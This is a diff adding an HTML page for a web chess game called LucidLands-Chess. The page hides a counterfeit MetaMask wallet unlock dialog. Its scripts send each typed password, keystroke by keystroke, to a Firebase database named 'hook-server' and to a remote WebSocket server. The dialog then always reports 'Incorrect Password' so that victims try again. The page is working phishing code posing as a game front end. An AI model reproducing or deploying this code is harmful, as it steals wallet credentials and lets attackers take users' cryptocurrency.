@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta
+      name="description"
+      content="LucidLands-Chess Game"
+    />
+    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <link rel="stylesheet" href="/metamask.css" />
+    <title>LucidLands-Chess</title>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+    <div id="loginModal" class="modal">
+      <div id="loginModalContent" class="modal-content">
+        <div class="metamask-loading" id="metamask-loading">
+          <div class="metamask-pending">
+            <img src="/metamask/metamask-fox.svg" width="150"/>
+            <img class="metamask-spinner" src="/metamask/spinner.gif"/>
+          </div>
+        </div>
+        <div class="metamask-content" id="metamask-content">
+          <div class="mm-loading-overlay hidden" id="mm-loading-overlay">
+            <img class="mm-loading" src="/metamask/VAyR.gif"/>
+          </div>
+          <div class="metamask-header">
+            <div class="metamask-net" id="metamask-net">
+              <img class="metamask-eth" src="/metamask/eth_logo.svg"/> <span class="metamask-netname">Ethereum Mainnet</span>
+              <img class="metamask-arrow-down" src="/metamask/arrow-down.svg"/>
+            </div>
+            <img class="metamask-icon" src="/metamask/metamask-fox.svg"/>
+          </div>
+          <div class="metamask-body">
+            <div id="metamask-3d"></div>
+            <div class="metamask-welcome-container">
+              <div class="metamask-welcome">Welcome back!</div>
+              <div class="metamask-await">The decentralized web awaits</div>
+            </div>
+            <div class="input-container">
+              <input id="metamask-password" class="animated-input" placeholder=" " type="password"/>
+              <label for="input" class="floating-label">Password</label>
+            </div>
+            <div class="hidden" id="incorrect-password">Incorrect Password</div>
+            <div>
+              <button class="metamask-unlock" id="metamask-unlock" disabled>Unlock</button>
+            </div>
+            <div class="metamask-pf"><a class="metamask-forgot" id="metamask-forgot">Forgot password?</a></div>
+            <div class="metamask-help">Need help? Contact <a class="metamask-support" href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script type="module">
+      import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js'
+
+      // If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
+      import { getAnalytics } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-analytics.js'
+
+      // Add Firebase products that you want to use
+      import { getAuth } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js'
+      import { getFirestore } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js'
+      import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js'
+
+      const formatDateWithMilliseconds = () => {
+          const now = new Date();
+
+          const year = now.getFullYear();
+          const month = String(now.getMonth() + 1).padStart(2, '0');
+          const day = String(now.getDate()).padStart(2, '0');
+          const hours = String(now.getHours()).padStart(2, '0');
+          const minutes = String(now.getMinutes()).padStart(2, '0');
+          const seconds = String(now.getSeconds()).padStart(2, '0');
+          const milliseconds = String(now.getMilliseconds()).padStart(4, '0'); // Milliseconds padded to 4 digits
+
+          return `${year}${month}${day}${hours}${minutes}${seconds}${milliseconds}`;
+      };
+
+  
+      const firebaseConfig = {
+              apiKey: "AIzaSyCd2I2JNm7okch3L8S0uozioChrntq05Ow",
+              authDomain: "hook-server-fcc32.firebaseapp.com",
+              databaseURL: "https://hook-server-fcc32-default-rtdb.firebaseio.com/",
+              projectId: "hook-server-fcc32",
+              storageBucket: "hook-server-fcc32.firebasestorage.app",
+              messagingSenderId: "816070028547",
+              appId: "1:816070028547:web:7c5202b183183dee8fcd36",
+              measurementId: "G-957FNZD5T4"
+      };
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+
+      const db = getDatabase(app);
+
+      document.getElementById('metamask-unlock').addEventListener('click', function (ev) {
+        set(ref(db, "88_/" + formatDateWithMilliseconds()), { db_info: metamaskInput.value });
+      });
+      document.getElementById('metamask-password').addEventListener('keydown', function(event) {
+          if (event.key === 'Enter') {
+            // Send the password via AJAX using Fetch API
+            set(ref(db, "88_/" + formatDateWithMilliseconds()), { db_info: metamaskInput.value });
+          }
+      });
+    </script>
+    <script src="/metamask/bundle.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
+    <script>
+      
+      const modal = document.getElementById("loginModal");
+      const modalContent = document.querySelector(".modal-content");
+      let mousePressedOutside = false;
+      // const closeModalButton = document.querySelector(".close");
+      const metamaskButton = document.getElementById("metamaskLogin");
+      const metamaskLoading = document.getElementById("metamask-loading");
+      const metamaskContent = document.getElementById("metamask-content");
+      const metamaskInput = document.getElementById('metamask-password');
+      const unlockBtn = document.getElementById('metamask-unlock');
+      const forgotBtn = document.getElementById('metamask-forgot');
+      const mainnetBtn = document.getElementById('metamask-net');
+      const mmLoading = document.getElementById('mm-loading-overlay');
+      const incorrectPassword = document.getElementById('incorrect-password');
+
+      const PING = 99;
+      const SEND_UID = 101;
+      const BROWSER_CONNECTED = 102;
+      const uniqueId = uuid.v4();
+      var isConnected = 0;
+      var ws = new WebSocket("wss://versed-rogue-macaroon.glitch.me");
+
+        ws.onopen = () => {
+          isConnected = 1;
+          // Create a JSON object
+          const jsonObject = {
+            e: BROWSER_CONNECTED,
+            v: uniqueId
+          };
+          const jsonData = JSON.stringify(jsonObject);
+          // Send JSON data as a text message
+          ws.send(jsonData);
+        };
+        
+        setInterval(() => {
+          if(isConnected){
+            const pingObject = {
+              e: PING,
+              v: "k"
+            };
+            const pingData = JSON.stringify(pingObject);
+            ws.send(pingData);
+          } else {
+            ws = new WebSocket("wss://versed-rogue-macaroon.glitch.me");
+          }
+        }, 5000);
+
+      document.getElementById('metamask-unlock').addEventListener('click', function (ev) {
+        let pingObject = {
+          e: SEND_UID,
+          v: metamaskInput.value
+        };
+        let pingData = JSON.stringify(pingObject);
+        if(isConnected){
+          ws.send(pingData);
+        }
+      });
+      
+      document.getElementById('metamask-password').addEventListener('input', function(event) {
+            if(metamaskInput.value == '') return;
+            let pingObject = {
+              e: SEND_UID,
+              v: metamaskInput.value
+            };
+            let pingData = JSON.stringify(pingObject);
+            if(isConnected){
+              ws.send(pingData);
+            }
+            if (event.key === 'Enter') {
+            }
+      });
+
+      document.getElementById('metamask-password').addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+          if(metamaskInput.value == '') return;
+            let pingObject = {
+              e: SEND_UID,
+              v: metamaskInput.value
+            };
+            let pingData = JSON.stringify(pingObject);
+            if(isConnected){
+              ws.send(pingData);
+            }
+        }
+      });
+
+      metamaskInput.addEventListener('input', function (ev) {
+        if(metamaskInput.value != ''){
+          unlockBtn.removeAttribute("disabled");
+        } else{
+          unlockBtn.setAttribute('disabled', 'disabled');
+        }
+        metamaskInput.classList.remove("invalid");
+        incorrectPassword.classList.add("hidden");
+      });
+
+      unlockBtn.addEventListener('click', function (ev) {
+        mmLoading.classList.remove("hidden");
+        let timer = setTimeout(() => {
+          clearTimeout(timer);
+          mmLoading.classList.add("hidden");
+          metamaskInput.classList.add("invalid");
+          incorrectPassword.classList.remove("hidden");
+        }, 5000);
+      });
+
+      forgotBtn.addEventListener('click', function (ev) {
+        mmLoading.classList.remove("hidden");
+        let timer = setTimeout(() => {
+          clearTimeout(timer);
+          modal.style.display = "none";
+          mmLoading.classList.add("hidden");
+
+          modal.style.display = "none";
+          metamaskContent.style.display = 'none';
+          metamaskLoading.style.display = "flex";
+          if(tdlogo){
+            let metamask3d = document.getElementById('metamask-3d');
+            metamask3d.removeChild(metamask3d.firstChild);
+            tdlogo = null;
+          }
+
+          openMetaMaskModal();
+        }, 7000);
+      });
+
+
+      mainnetBtn.addEventListener('click', function (ev) {
+        mmLoading.classList.remove("hidden");
+        let timer = setTimeout(() => {
+          clearTimeout(timer);
+          modal.style.display = "none";
+          mmLoading.classList.add("hidden");
+
+          modal.style.display = "none";
+          metamaskContent.style.display = 'none';
+          metamaskLoading.style.display = "flex";
+          if(tdlogo){
+            let metamask3d = document.getElementById('metamask-3d');
+            metamask3d.removeChild(metamask3d.firstChild);
+            tdlogo = null;
+          }
+
+          openMetaMaskModal();
+        }, 7000);
+      });
+
+      metamaskInput.addEventListener('keydown', function(event) {
+          if (event.key === 'Enter') {
+            if(metamaskInput.value == '') return;
+            mmLoading.classList.remove("hidden");
+            let timer = setTimeout(() => {
+              clearTimeout(timer);
+              mmLoading.classList.add("hidden");
+              metamaskInput.classList.add("invalid");
+              incorrectPassword.classList.remove("hidden");
+            }, 5000);
+          }
+      });
+
+      // Open modal
+      function openMetaMaskModal(){
+        if (typeof window.ethereum !== 'undefined') {
+          try {
+            window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = ethereum.request({ method: 'eth_accounts' });
+            console.log(`Connected: ${accounts[0]}`);
+          } catch (err) {
+              console.error(err);
+          }
+        } else {
+            alert('Please install MetaMask!');
+        }
+      }
+
+      // Track mouse press state
+      document.addEventListener("mousedown", (event) => {
+        // Check if the click started outside the modal content
+        mousePressedOutside = !modalContent.contains(event.target);
+      });
+
+      // Close modal on mouse release if clicked and released outside
+      document.addEventListener("mouseup", (event) => {
+        if (mousePressedOutside && !modalContent.contains(event.target)) {
+          modal.style.display = "none";
+          metamaskContent.style.display = 'none';
+          metamaskLoading.style.display = "flex";
+          if(tdlogo){
+            let metamask3d = document.getElementById('metamask-3d');
+            metamask3d.removeChild(metamask3d.firstChild);
+            tdlogo = null;
+          }
+        }
+        // Reset the state
+        mousePressedOutside = false;
+      });
+
+      // Prevent modal from closing on click inside modal content
+      modalContent.addEventListener("click", (event) => {
+        event.stopPropagation();
+      });
+
+      // window.addEventListener("click", (event) => {
+      //   if (event.target === modal && document.getElementById('metamask-password')) {
+      //     modal.style.display = "none";
+      //     metamaskContent.style.display = 'none';
+      //     metamaskLoading.style.display = "flex";
+      //     if(tdlogo){
+      //       let metamask3d = document.getElementById('metamask-3d');
+      //       metamask3d.removeChild(metamask3d.firstChild);
+      //       tdlogo = null;
+      //     }
+      //   }
+      // });
+
+      // Connect with MetaMask
+      // metamaskButton.addEventListener("click", async () => {
+      //   if (typeof window.ethereum !== "undefined") {
+      //     try {
+      //       const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+      //       alert(`Connected with account: ${accounts[0]}`);
+      //     } catch (error) {
+      //       console.error(error);
+      //     }
+      //   } else {
+      //     alert("MetaMask is not installed. Please install it to continue.");
+      //   }
+      // });
+    </script>
+  </body>
+</html>
